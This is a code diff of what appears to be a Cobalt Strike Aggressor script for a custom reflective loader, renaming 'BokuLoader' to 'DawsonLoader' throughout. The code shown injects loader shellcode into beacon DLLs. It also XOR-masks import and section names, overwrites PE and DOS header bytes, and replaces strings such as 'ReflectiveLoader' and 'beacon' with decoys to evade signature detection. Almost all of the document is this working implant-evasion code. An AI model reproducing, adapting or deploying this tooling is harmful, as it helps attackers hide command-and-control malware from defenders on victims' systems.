@@ -86,7 +86,7 @@ sub getStringFromOffset {
 }
 
 
-sub boku_pe_mask_ImportStrings {
+sub dawson_pe_mask_ImportStrings {
 	local('%pemap');
 	local('$beacon_dll $xorKey');
 	local('$name_raw $dllstr_raw_vs_rva_diff $out @sorted_keys $key $val @import_dll_name_RVA $i');
@@ -225,7 +225,7 @@ sub boku_pe_mask_ImportStrings {
 }
 
 
-sub boku_pe_mask_SectionNames {
+sub dawson_pe_mask_SectionNames {
 	local('%pemap');
 	local('@section0A @section1A @section2A @section3A @section4A');
     local('$section0 $section1 $section2 $section3 $section4');
@@ -401,27 +401,27 @@ sub setNops{
 	return $beacon_dll;
 }
 
-sub boku_pe_mask{
-	local('$maskkey $boku_pe_dll');
-    $boku_pe_dll = $1;
+sub dawson_pe_mask{
+	local('$maskkey $dawson_pe_dll');
+    $dawson_pe_dll = $1;
     $maskkey = 123;
 	# CS RDI Code push r10; pop r10; MZAR - Make it NOPNOPNOPNOP
-    $boku_pe_dll = setNops($boku_pe_dll, 0x00);
-    $boku_pe_dll = setNops($boku_pe_dll, 0x02);
+    $dawson_pe_dll = setNops($dawson_pe_dll, 0x00);
+    $dawson_pe_dll = setNops($dawson_pe_dll, 0x02);
 	# Removing before 0x32 messes with the SRDI + Cant remove 0x3C-0x3D (offset to newExeHeader)
-    $boku_pe_dll = pe_mask($boku_pe_dll, 0x33, 0x8, $maskkey);
+    $dawson_pe_dll = pe_mask($dawson_pe_dll, 0x33, 0x8, $maskkey);
     # Remove DOS header string
-    $boku_pe_dll = pe_mask($boku_pe_dll, 0x4D, 0x02, $maskkey);
-    $boku_pe_dll = pe_mask($boku_pe_dll, 0x58, 32,   $maskkey);
+    $dawson_pe_dll = pe_mask($dawson_pe_dll, 0x4D, 0x02, $maskkey);
+    $dawson_pe_dll = pe_mask($dawson_pe_dll, 0x58, 32,   $maskkey);
 	# PE Header
-    $boku_pe_dll = pe_mask($boku_pe_dll, 0x80, 0x4,  $maskkey);
+    $dawson_pe_dll = pe_mask($dawson_pe_dll, 0x80, 0x4,  $maskkey);
     # Other Header Masking
-    $boku_pe_dll = pe_mask($boku_pe_dll, 0x84, 0x2,  $maskkey);
-    $boku_pe_dll = pe_mask($boku_pe_dll, 0x88, 0xB,  $maskkey);
-    $boku_pe_dll = pe_mask($boku_pe_dll, 0x96, 0x6,  $maskkey);
-    $boku_pe_dll = pe_mask($boku_pe_dll, 0xBC, 0x13, $maskkey);
+    $dawson_pe_dll = pe_mask($dawson_pe_dll, 0x84, 0x2,  $maskkey);
+    $dawson_pe_dll = pe_mask($dawson_pe_dll, 0x88, 0xB,  $maskkey);
+    $dawson_pe_dll = pe_mask($dawson_pe_dll, 0x96, 0x6,  $maskkey);
+    $dawson_pe_dll = pe_mask($dawson_pe_dll, 0xBC, 0x13, $maskkey);
 
-    return $boku_pe_dll;
+    return $dawson_pe_dll;
 }
 
 sub prependBytes{
@@ -437,10 +437,10 @@ sub prependBytes{
 }
 
 # ! WARNING - String has to be the same size or it throws off relocation table and beacon will crash while loading
-sub boku_strrep {
+sub dawson_strrep {
 	local('$beacon_dll');
 	$beacon_dll = $1;
-	$beacon_dll = strrep($beacon_dll, "ReflectiveLoader", "__BokuLoader____");
+	$beacon_dll = strrep($beacon_dll, "ReflectiveLoader", "__DawsonLoader__");
 	$beacon_dll = strrep($beacon_dll, "Microsoft Base Cryptographic Provider v1.0", "12367321236742382543232341241261363163151d");
 	$beacon_dll = strrep($beacon_dll, "(admin)", "(tomin)");
 	$beacon_dll = strrep($beacon_dll, "beacon", "bacons");
@@ -838,7 +838,7 @@ sub setChecksum{
 	return $temp_beacon_dll;
 }
 
-sub boku_pe_customPE{
+sub dawson_pe_customPE{
 	local('$PE_value $temp_dll $$PE_location');
 	$temp_dll    = $1;
 	$PE_value    = $2;
@@ -849,7 +849,7 @@ sub boku_pe_customPE{
 }
 
 
-sub boku_pe_customMZ{
+sub dawson_pe_customMZ{
 	local('$PEval');
 	$temp_dll = $1;
 	$MZval    = $2;
@@ -858,7 +858,7 @@ sub boku_pe_customMZ{
 	return $temp_dll;
 }
 
-sub boku_pe_MZ_from_C2Profile{
+sub dawson_pe_MZ_from_C2Profile{
 	$temp_beacon_dll  = $1;
 	$magic_mz         = $2;
 
@@ -894,14 +894,14 @@ sub generate_my_dll {
 
 	if ($3 eq "x86")
 	{
-		warn("Error: x86 not supported by BokuLoader.");
+		warn("Error: x86 not supported by DawsonLoader.");
 		return $null;	
 	}
 
 	$isPivot = 0;
 	if ("pivot." isin $1)
 	{
-		warn("Pivot beacons are an experimental feature of BokuLoader, good luck!");
+		warn("Pivot beacons are an experimental feature of DawsonLoader, good luck!");
 		$isPivot = 1;
 	}
 
@@ -924,8 +924,8 @@ sub generate_my_dll {
 	$magic_pe       = [$profile getString: ".stage.magic_pe"];
 	$DLL_name       = [$profile getString: ".stage.name"];
 
-	# Read in BokuLoader.x64.o object file into byte array
-	$name = "BokuLoader";
+	# Read in DawsonLoader.x64.o object file into byte array
+	$name = "DawsonLoader";
 	$name = $name .".x64.o";
 	warn("loading: " . $name);
 
@@ -939,7 +939,7 @@ sub generate_my_dll {
 		return $null;
 	}
 
-	# Extract the reflective loader shellcode from .text section of Bokuloader.x64.o
+	# Extract the reflective loader shellcode from .text section of DawsonLoader.x64.o
 	$loader = extract_reflective_loader($data);
 	warn("Extracted Length: " . strlen($loader));
 	if (strlen($loader) eq 0) {
@@ -947,7 +947,7 @@ sub generate_my_dll {
 		return $null;
 	}
 
-	# Write bokuloader shellcode to raw beacon dll
+	# Write dawsonloader shellcode to raw beacon dll
 	$temp_dll = setup_reflective_loader($2, $loader);
 	println("[+] Beacon DLL size: 0x".uc(formatNumber(strlen($temp_dll), 16)));
 	
@@ -1018,12 +1018,12 @@ sub generate_my_dll {
 	$temp_dll = setup_obfuscate_xor_key($temp_dll,$obfuscate,$xorKey);
 	if ($obfuscate eq "true") {
 		println("## Obfuscating section names, DLL import names, and DLL import entry names with XOR key: ".uc(formatNumber($xorKey, 16)));
-		$temp_dll = boku_pe_mask_ImportStrings($temp_dll, $xorKey, $isPivot);
+		$temp_dll = dawson_pe_mask_ImportStrings($temp_dll, $xorKey, $isPivot);
 		if (strlen($temp_dll) eq 0) {
 			warn("Failed obfuscating beacon import DLL strings!");
 			return $null;
 		}
-		$temp_dll = boku_pe_mask_SectionNames($temp_dll, $xorKey);
+		$temp_dll = dawson_pe_mask_SectionNames($temp_dll, $xorKey);
 	} 
 	# honor C2 malleable PE modifications in C2 profile
 	# Disabled because the obfuscate breaks it and it won't be applied 
@@ -1031,8 +1031,8 @@ sub generate_my_dll {
 #	$temp_dll = setup_strings($temp_dll);
 
 #	$temp_dll = setEgg($temp_dll);
-#	$temp_dll = boku_pe_mask($temp_dll); # Currrently causes issue if prepend transform is in C2 profile. Causes wrong bytes to be overwritten due to offset change
-	$temp_dll = boku_strrep($temp_dll);
+#	$temp_dll = dawson_pe_mask($temp_dll); # Currrently causes issue if prepend transform is in C2 profile. Causes wrong bytes to be overwritten due to offset change
+	$temp_dll = dawson_strrep($temp_dll);
 #	$temp_dll = prependBytes($temp_dll);
 
 	# MZ Header
